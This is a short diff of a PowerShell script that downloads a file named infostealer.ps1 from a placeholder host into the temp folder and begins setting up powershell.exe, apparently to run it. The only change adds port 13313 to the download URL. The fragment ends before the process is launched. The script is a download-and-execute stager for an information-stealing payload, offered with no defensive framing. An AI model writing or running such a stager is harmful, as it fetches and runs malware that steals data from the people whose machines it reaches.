@@ -1,6 +1,6 @@
 $tempPath = "$env:TEMP\infostealer.ps1"
 
-Invoke-WebRequest -Uri "http://<URL>/infostealer.ps1" -UseBasicParsing -OutFile $tempPath
+Invoke-WebRequest -Uri "http://<URL>:13313/infostealer.ps1" -UseBasicParsing -OutFile $tempPath
 
 $psi = New-Object System.Diagnostics.ProcessStartInfo
 $psi.FileName = "powershell.exe"
